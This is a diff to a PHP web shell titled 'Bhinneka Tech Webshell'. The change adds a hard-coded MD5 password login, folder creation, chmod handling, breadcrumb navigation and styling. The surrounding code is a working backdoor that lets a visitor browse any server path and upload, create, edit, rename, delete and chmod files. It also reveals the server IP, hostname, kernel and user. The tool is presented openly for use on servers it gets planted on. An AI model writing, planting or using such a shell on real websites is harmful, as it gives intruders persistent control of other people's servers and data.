@@ -1,7 +1,15 @@
 <?php
 
-//Author by Ibrahim - Bhineka Tech
+//Author by xpl0dec - Bhinneka Tech
 error_reporting(0);
+$password = "98ea06f4eecce2bf62f585401f273390"; //BhinnekaTech
+session_start();
+
+if(md5($_POST['password']) == $password) {
+	$_SESSION['isLogin'] = true;
+}else {
+	loginShell();
+}
 
 function info() {
   $arr = [
@@ -19,27 +27,30 @@ $getInfo = info();
 
 if(strtoupper(substr($getInfo['os'], 0, 3)) == 'WIN') {
   $getInfo['os'] = 'Windows';
+  $paths = explode('\\', $getInfo['path']);
+  $paths = $paths[0] . '/';
 }else if(strtoupper(substr($getInfo['os'], 0, 3)) == 'LIN') {
   $getInfo['os'] = 'Linux';
+  $paths = '/';
 }
 
 
 $dir = getcwd();
-$replace = str_replace('\\', '/', $dir);
-$pecah = explode('/', $replace);
 
-function setPath($list) {
-	$dir = "";
-	for($i=0; $i < count($list); $i++) {
-		for($j=0; $j < $i; $j++) {
-			$dir .= $list[$j] . '/';
+if(isset($_GET['path'])) {
+	$replace = str_replace('\\', '/', $_GET['path']);
+	$replace = str_replace('//', '/', $_GET['path']);
+	$pecah = explode('/', $replace);
+}else {
+	$replace = str_replace('\\', '/', $dir);
+	$pecah = explode('/', $replace);
+}
+
+function loginShell() {
+		if(!isset($_SESSION['isLogin'])) {
+			echo "<form method='POST'><input type='text' name='password' type='password'><button type='submit'>Submit</button></form>";
+			die();
 		}
-
-		$dir .= $list[$i] . ' ';
-   }
-
-   $dirArr = explode(' ', $dir);
-   return $dirArr;
 }
 
 function cekPermission($filenya) {
@@ -136,24 +147,33 @@ function uploadFile($fileSementara, $fileUpload) {
 	}
 }
 
+function folder_exist($folder)
+{
+    $path = realpath($folder);
 
-$pecahLagi = setPath($pecah);
+    if($path !== false AND is_dir($path))
+    {
+        return true;
+    }
+
+    return false;
+}
+
 
 if(isset($_GET['path'])) {
 	$get = $_GET['path'];
 	$pec = explode('/', $get);
 
-	$getPath = setPath($pec);
-
 	if(is_file($get)) {
 		$konten = bungkus($get);
 		$cek = true;
+		$listDir = scandir($get);
+	}else {
+		$listDir = array_diff(scandir($get), ['.', '..']);
 	}
-
-	$listDir = scandir($get);
 }else {	
 	$get = $replace;
-	$listDir = scandir($get);
+	$listDir = array_diff(scandir($get), ['.', '..']);
 }
 
 if(isset($_POST['pilihan'])) {
@@ -220,13 +240,15 @@ if(isset($_POST['pilihan'])) {
 			$file = fileperms($_POST['dir']);
 			$permission = substr(sprintf('%o', $file), -4);
 			$dirFile = $_POST['dir'];
-			$perms = $_POST['perms'];
-			if(isset($perms)) {
-				if(chmod($dirFile, $perms)) {
-					$permission = $perms;
-					$successChmod ='Berhasil chmod!';
-				}else {
-				    $successChmod = 'Gagal chmod!';
+			$perms = octdec($_POST['perms']);
+			if(isset($_POST['perms'])) {
+				if(isset($perms)) {
+					if(chmod($dirFile, $perms)) {
+						$permission = decoct($perms);
+						$successChmod ='Berhasil chmod!';
+					}else {
+						$successChmod = 'Gagal chmod!';
+					}
 				}
 			}
 			break;
@@ -237,7 +259,7 @@ if(isset($_POST['pilihan'])) {
 			$dirPath = $_GET['path'] . '/';
 			if(isset($_POST['createAction'])) {
 				$namaFile = $_POST['createName'];
-				$isiFile = $_POST['createIsi'];
+				$isiFile = ($_POST['createIsi'] == NULL) ? ' ' : $_POST['createIsi'];
 				if(!file_exists($dirPath . $namaFile)) {
 					if(file_put_contents($dirPath . $namaFile, $isiFile)) {
 						$pesanCreate = 'File berhasil dibuat';
@@ -245,7 +267,22 @@ if(isset($_POST['pilihan'])) {
 						$pesanCreate = 'Directory not Writable';
 					}
 				}else {
-					$pesanCreate = 'Nama file sudah ada';
+					$pesanCreate = 'Nama file / folder sudah ada';
+				}
+			}
+			break;
+		case $_POST['pilihan'] == 'createFolder':
+			$dirPath = $_GET['path'] . '/';
+			if(isset($_POST['createFolder'])) {
+				$namaFolder = $_POST['createName'];
+				if(mkdir($dirPath . $namaFolder)) {
+					$pesanCreate = 'Folder berhasil dibuat';
+				}else {
+					if(is_dir($namaFolder)) {
+						$pesanCreate = 'Nama Folder / File sudah ada';
+					}elseif(!is_writable($dirPath)){
+						$pesanCreate = 'Directory not writable';
+					}
 				}
 			}
 			break;
@@ -279,99 +316,155 @@ if(isset($_POST['pilihan'])) {
 <!DOCTYPE html>
 <html>
 <head>
-	<title>Webshell Bhineka Tech</title>
+	<title>Webshell Bhinneka Tech</title>
 </head>
 <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/css/materialize.min.css">
+<meta name="viewport" content="width=1024">
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<meta name="viewport" content="width=device-width, initial-scale=0.60, shrink-to-fit=no">
 <style type="text/css">
+	body {
+		width: 100vw;
+  		height: 100px;
+		overflow-x: hidden !important;
+	}
+	.info {
+		display: block;
+		width: 100%;
+	}
+		
+	table.striped > tbody > tr:nth-child(odd) {
+		background-color: rgba(170, 213, 213, 0.5);
+	}
+	nav {
+		background-color: #42a5f5;
+	}
+	.select-wrapper {
+		position: relative;
+		width: 100px;
+		display: inline-block;
+	}
 
-.info {
-	display: block;
-}
+	.file-field .btn, .file-field .btn-large, .file-field .btn-small {
+		float: inherit;
+		height: 3rem;
+		line-height: 3rem;
+	}
+
+	.select-wrapper .caret {
+		right: auto !important;
+	}
+
+	.select-wrapper input.select-dropdown {
+		width: 50%;
+	}
+
+	textarea {
+    	height: 50rem !important;
+		overflow-y: scroll !important;
+		height: 700px !important;
+	}
+
+	.maung {
+		height: 700px !important;
+	}
+
+	table{
+		width:100%;
+		table-layout: fixed;
+		overflow-wrap: break-word;
+	}
 	
-table.striped > tbody > tr:nth-child(odd) {
-	background-color: rgba(170, 213, 213, 0.5);
-}
-nav {
-    background-color: #42a5f5;
-}
-.select-wrapper {
-    position: relative;
-    width: 100px;
-    display: inline-block;
-}
+	@media screen and (max-width: 732px) {
+		.navbar-text {
+			font-size: 25px !important;
+			width: 280px !important;
+		}
+	}
 
-.file-field .btn, .file-field .btn-large, .file-field .btn-small {
-    float: inherit;
-    height: 3rem;
-    line-height: 3rem;
-}
 </style>
 <body>
+	<div class="content">
 	<nav>
        <div class="container">
 	    <div class="nav-wrapper">
-	      <a href="#" class="brand-logo center">Bhineka Tech Webshell</a>
+	      <a href="#" class="brand-logo center navbar-text">Bhinneka Tech Webshell</a>
 	    </div>
 	   </div>
   	</nav>
 
   	<div class="container" style="margin-top: 30px;">
-        <b class="info">IP : <?= $getInfo['ip']; ?></b>
+        <b class="info">Server IP : <?= $getInfo['ip']; ?></b>
         <b class="info">Hostname : <?= $getInfo['host']; ?></b>
         <b class="info">Kernel : <?= $getInfo['kernel']; ?></b>
-        <b class="info">Disable Function : <?= empty($getInfo['disablefunc']) ? 'None :)  ' : $getInfo['disablefunc']; ?></b>
         <b class="info">OS : <?= $getInfo['os']; ?></b>
-	PATH:
-	<?php if(empty($_GET['path'])): $i = 0; foreach ($pecahLagi as $p) : ?>
-		<a href="?path=<?= $p; ?>"><?= @$pecah[$i++]; ?></a>/
-	<?php endforeach; else: $i = 0; foreach($getPath as $gets): ?> 
-		<a href="?path=<?= $gets; ?>"><?= @$pec[$i++]; ?></a>/
-	<?php endforeach; endif; ?>
+		<b class="info">USER : <?= get_current_user(); ?></b>
 	</div>
 	<br>	
 	<?php if($cek){ ?>
 
 <div class="container">
 <div class="row">
+	<div style="font-size: 17px;">
+	<?php   
+				echo '<a href="?path=' . $paths . '">' . '-' . '</a>';
+				for ($i = 1; $i < count($pecah); $i++) {
+					$subpath = implode('/', array_slice($pecah, 1, $i));
+					echo '/';
+					echo '<a href="?path=/' . urlencode($subpath) . '">' . $pecah[$i] . '</a>';
+				}
+				?>
+	</div>
     <form class="col s12">
       <div class="row">
         <div class="input-field col s12">
-          <textarea id="textarea" class="materialize-textarea" disabled><?= $konten; ?></textarea>
-          <label for="textarea" class='active'><?= $_GET['path']; ?></label>
+          <textarea id="textarea" class="materialize-textarea" style="background-color: ghostwhite; overflow-y: auto;" disabled><?= $konten; ?></textarea>
         </div>
       </div>
     </form>
   </div>
  </div>
 	<?php }else if($edit){ ?>
-<div class="container">
-<?= !empty($successEdit) ? "<p class='blue-text text-darken-2'>" . $successEdit . "</p>" : ""; ?>
-<form method="POST">
-<input type="hidden" name="dir" value="<?= $dirFile; ?>">
-<input type="hidden" name="pilihan" value="edit">
-<div class="row">
-    <form class="col s12">
-      <div class="row">
-        <div class="input-field col s12">
-          <textarea name="sourceFile" id="textarea" class="materialize-textarea"><?= bungkus($dirFile); ?></textarea>
-          <label for="textarea" class='active'>Edit File</label>
-          <button class="btn waves-effect waves-light" type="submit" name="action">Edit</button>
-        </div>
-      </div>
-    </form>
-  </div>
-</form>
-</div>
+		<div class="container">
+		<?php   
+				echo '<a href="?path=' . $paths . '">' . '-' . '</a>';
+				for ($i = 1; $i < count($pecah); $i++) {
+					$subpath = implode('/', array_slice($pecah, 1, $i));
+					echo '/';
+					echo '<a href="?path=/' . urlencode($subpath) . '">' . $pecah[$i] . '</a>';
+				}
+		?>
+		<?= !empty($successEdit) ? "<p class='blue-text text-darken-2'>" . $successEdit . "</p>" : ""; ?>
+		<form method="POST">
+		<input type="hidden" name="dir" value="<?= $dirFile; ?>">
+		<input type="hidden" name="pilihan" value="edit">
+		<div class="row">
+			<form class="col s12">
+				<div class="input-field col s12">
+				<textarea name="sourceFile" id="textarea" class="materialize-textarea" style="background-color: ghostwhite; overflow-y: auto;" ><?= bungkus($dirFile); ?></textarea>
+				<label for="textarea" class='active'>Edit File</label>
+				<button class="btn waves-effect waves-light" type="submit" name="action">Edit</button>
+			</form>
+		</div>
+		</form>
+		</div>
 	<?php }else if($rename){ ?>
 		<div class="container">
+		<?php   
+				echo '<a href="?path=' . $paths . '">' . '-' . '</a>';
+				for ($i = 1; $i < count($pecah); $i++) {
+					$subpath = implode('/', array_slice($pecah, 1, $i));
+					echo '/';
+					echo '<a href="?path=/' . urlencode($subpath) . '">' . $pecah[$i] . '</a>';
+				}
+				?>
 		<?= !empty($successRename) ? "<p class='blue-text text-darken-2'>" . $successRename . "</p>" : ""; ?>
 		<form method="POST">
 			<input type="hidden" name="dir" value="<?= $dirFile; ?>">
 			<input type="hidden" name="pilihan" value="rename">
 			  <div class="row center-align">
-			    <div class="input-field col s6">
+			    <div class="input-field col s12">
 			      <input value="<?= $filename; ?>" name="namaBaru" id="rename" type="text" class="validate">
 			      <label class="active" for="rename">Input disini:</label>
 			      <button class="btn waves-effect waves-light" type="submit" name="action">Rename</button>
@@ -381,12 +474,20 @@ nav {
 		</div>
 	<?php }else if($chmod) { ?>
 		<div class="container">
+		<?php   
+				echo '<a href="?path=' . $paths . '">' . '-' . '</a>';
+				for ($i = 1; $i < count($pecah); $i++) {
+					$subpath = implode('/', array_slice($pecah, 1, $i));
+					echo '/';
+					echo '<a href="?path=/' . urlencode($subpath) . '">' . $pecah[$i] . '</a>';
+				}
+				?>
 		<?= !empty($successChmod) ? "<p class='blue-text text-darken-2'>" . $successChmod . "</p>" : ''; ?>
 		<form method="POST">
 			<input type="hidden" name="dir" value="<?= $dirFile; ?>">
 			<input type="hidden" name="pilihan" value="chmod">
 			  <div class="row center-align">
-			    <div class="input-field col s6">
+			    <div class="input-field col s12">
 			      <input value="<?= $permission; ?>" name="perms" id="chmod" type="text" class="validate">
 			      <label class="active" for="chmod">Input disini:</label>
 			      <button class="btn waves-effect waves-light" type="submit" name="action">Chmod</button>
@@ -397,11 +498,19 @@ nav {
 	<?php }else if(isset($_GET['create'])){ ?>
 		<br>
 		<div class="container">
+		<?php   
+				echo '<a href="?path=' . $paths . '">' . '-' . '</a>';
+				for ($i = 1; $i < count($pecah); $i++) {
+					$subpath = implode('/', array_slice($pecah, 1, $i));
+					echo '/';
+					echo '<a href="?path=/' . urlencode($subpath) . '">' . $pecah[$i] . '</a>';
+				}
+				?>
 		<?= !empty($pesanCreate) ? "<p class='blue-text text-darken-2'>" . $pesanCreate . "</p>" : ""; ?>
 		<form method="POST">
 			<input type="hidden" name="pilihan" value="create">
 			  <div class="row center-align">
-			    <div class="input-field col s6">
+			    <div class="input-field col s12">
 			      <input name="createName" id="createFile" type="text" class="validate" value="<?= $namaFile; ?>">
 			      <label class="active" for="createFile">Nama File</label>
 			      <textarea name="createIsi" class="materialize-textarea" style="height: 400px; background-color: ghostwhite; overflow-y: scroll;"><?= $isiFile; ?></textarea>
@@ -410,10 +519,33 @@ nav {
 			  </div>
 		</form>
 		</div>
+	<?php }else if(isset($_GET['createFolder'])){ ?>
+		<div class="container">
+		<?php   
+				echo '<a href="?path=' . $paths . '">' . '-' . '</a>';
+				for ($i = 1; $i < count($pecah); $i++) {
+					$subpath = implode('/', array_slice($pecah, 1, $i));
+					echo '/';
+					echo '<a href="?path=/' . urlencode($subpath) . '">' . $pecah[$i] . '</a>';
+				}
+				?>
+		<?= !empty($pesanCreate) ? "<p class='blue-text text-darken-2'>" . $pesanCreate . "</p>" : ""; ?>
+		<form method="POST">
+			<input type="hidden" name="pilihan" value="createFolder">
+			  <div class="row center-align">
+			    <div class="input-field col s12">
+			      <input name="createName" id="createFolder" type="text" class="validate" value="<?= $namaFolder; ?>">
+			      <label class="active" for="createFolder">Nama Folder</label>
+			      <button class="btn waves-effect waves-light" type="submit" name="createFolder">Create</button>
+			    </div>
+			  </div>
+		</form>
+		</div>
 	<?php }else{ ?>
-	<div class="container">	
+   <div class="container">	
    <b class="info">
-	 <a href="?create&path=<?= isset($_GET['path']) ? $_GET['path'] : $replace; ?>" class="btn-floating btn-large waves-effect waves-light red"><i class="material-icons">add</i></a> Add File
+	 <a href="?create&path=<?= isset($_GET['path']) ? $_GET['path'] : $replace; ?>" class="btn-floating btn-large waves-effect waves-light red"><i class="material-icons">add</i></a> <b>Add File&nbsp;&nbsp;&nbsp;</b>
+	 <a href="?createFolder&path=<?= isset($_GET['path']) ? $_GET['path'] : $replace; ?>" class="btn-floating btn-large waves-effect waves-light blue""><i class="material-icons">add</i></a> <b>Add Folder</b>
 	<br>
 	<b class="info">
 		 <form method="POST" enctype="multipart/form-data">
@@ -432,10 +564,23 @@ nav {
 		    </div>
   		</form>
 	</b>
+	<!-- <div style="font-size: 18px;"> -->
+	<div class="row"><div class="col s12" style="font-size: 18px;">
+	PATH:
+	<?php   
+				echo '<a href="?path=' . $paths . '">' . '-' . '</a>';
+				for ($i = 1; $i < count($pecah); $i++) {
+					$subpath = implode('/', array_slice($pecah, 1, $i));
+					echo '/';
+					echo '<a href="?path=/' . urlencode($subpath) . '">' . $pecah[$i] . '</a>';
+				}
+				?>
+	</div></div>
 </div>
+
    <div class="container">	
 	<table class="striped centered bordered">
-		<?= !empty($pesanHapus) ? $pesanHapus : ''; ?>
+		<?= !empty($pesanHapus) ? $pesanHapus : ''; ?>			
 		<thead>	
 		<tr>
 			<th>Nama</th>
@@ -446,19 +591,21 @@ nav {
 		</thead>
 		<?php foreach($listDir as $dir): ?>
 		<tr>
-			<td><a style="color: black;" href="?path=<?= $get . '/' . $dir; ?>"><?= $dir; ?></a></td>
+			<td><a style="color: black;" href="?path=<?= str_replace([".", "//"], ["%2e", '/'], $get . '/' . $dir); ?>"><?= $dir; ?></a></td>
 			<td><?= is_file($get . '/' . $dir) ? hitungSize($get . '/' . $dir) : 'Folders'; ?></td>
 			<td><?= is_writable($get . '/' . $dir) ? '<font color="green">' . @cekPermission($get . '/' . $dir) . '</font>' : '<font color="red">' . @cekPermission($get . '/' . $dir) . '</font>';?></td>
 			<td>
 				<?php if(is_file($get . '/' . $dir)): ?>
-				<form method="POST" action="?set&path=<?= $get; ?>">	
-					<select name="pilihan" style="height: 100px;">
+				<form method="POST" action="?set&path=<?= $get; ?>">
+					<center>
+					<select class="browser-default" name="pilihan" style="height: 30px; width: 70px; z-index: 1;">
 						<option value="Select" disabled selected>Pilih</option>
 						<option value="rename">Rename</option>
 						<option value="edit">Edit</option>
 						<option value="delete">Delete</option>
 						<option value="chmod">Chmod</option>
 					</select>
+					</center>
 					<input type="hidden" name="type" value="file">
 					<input type="hidden" name="namaFile" value="<?= $dir; ?>">
 					<input type="hidden" name="dir" value="<?= $get . '/' . $dir ?>">
@@ -468,12 +615,14 @@ nav {
 				</form>
 				<?php else: ?>
 				<form method="POST" action="?set&path=<?= $get; ?>">	
-					<select name="pilihan">
+					<center>
+					<select class="browser-default" name="pilihan" style="height: 30px; width: 70px; z-index: 1;" name="pilihan">
 						<option value="Select" disabled selected>Pilih</option>
 						<option value="rename">Rename</option>
 						<option value="delete">Delete</option>
 						<option value="chmod">Chmod</option>
 					</select>
+					</center>
 					<input type="hidden" name="type" value="folder">
 					<input type="hidden" name="namaFile" value="<?= $dir; ?>">
 					<input type="hidden" name="dir" value="<?= $get . '/' . $dir ?>">
@@ -488,9 +637,30 @@ nav {
 	</table>
 </div>
 	<?php } ?>
+</div>
+
+	<footer id="footer" style="margin-top: 100px;">
+
+	</footer>
 
 <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js"></script>
-<script>
+<script> 
+
+var footer = document.querySelector("footer");
+
+function stopScrollAtFooter() {
+    var footerHeight = footer.clientHeight;
+    var contentHeight = document.body.scrollHeight;
+    var scrollY = window.scrollY;
+
+	if (scrollY + window.innerHeight >= contentHeight - footerHeight) {
+			window.scrollTo(0, contentHeight - window.innerHeight);
+		}
+	}
+
+	window.addEventListener("scroll", stopScrollAtFooter);
+
+
 	document.addEventListener('DOMContentLoaded', function() {
     var elems = document.querySelectorAll('select');
     var instances = M.FormSelect.init(elems, {});
